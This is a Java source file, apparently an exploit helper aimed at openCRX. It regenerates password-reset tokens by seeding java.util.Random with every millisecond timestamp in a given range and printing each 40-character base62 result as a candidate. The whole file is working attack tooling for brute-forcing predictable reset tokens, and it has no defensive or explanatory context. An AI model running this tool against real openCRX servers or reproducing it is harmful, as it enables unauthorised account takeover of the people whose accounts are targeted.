/*
Compile before usage:
javac OpenCRXToken.java
java OpenCRXToken <start_timestamp> <stop_timestamp>
*/

import java.util.Random;
 
public class OpenCRXToken {
 
    public static void main(String args[]) {
        int length = 40;
        if(args.length < 1){
            System.out.println("\n[!] Usage: java OpenCRXToken <start_timestamp> <stop_timestamp>");
            System.exit(0);
        }
        long start = Long.parseLong(args[0]);
        long stop = Long.parseLong(args[1]);
        String token = "";
        

        for (long l = start; l < stop; l++) {
            token = getRandomBase62(length, l);
            System.out.println(token);
        }
    }
  
    public static String getRandomBase62(int length, long seed) {
        Random random = new Random(seed);
        String s = "";
        for (int i = 0; i < length; i++) {
            s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
        }
        return s;
    }
}
